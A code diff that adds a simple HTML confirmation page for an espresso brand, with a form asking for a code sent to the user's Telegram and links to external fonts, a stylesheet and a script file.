@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Brand Espresso — Confirm</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Great+Vibes&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="conf.css" />
+</head>
+<body>
+
+  <div class="overlay"></div>
+
+  <div class="logo-top">
+    Y&S_Espresso
+  </div>
+
+  <div class="container">
+    <h1>
+      brand <br>
+      <span>Espresso</span>
+    </h1>
+
+    <p>Enter the code sent to your Telegram</p>
+
+    <form onsubmit="verifyCode(event)">
+      <input
+        type="text"
+        inputmode="numeric"
+        placeholder="Your code"
+        id="verifyInput"
+        autocomplete="one-time-code"
+      />
+      <input type="text" id="in" placeholder="Repait">
+      <p id="errorMsg" class="error-msg"></p>
+      <button type="submit" id="verifyBtn">confirm</button>
+    </form>
+  </div>
+
+  <script src="./conf.js"></script>
+</body>
+</html>
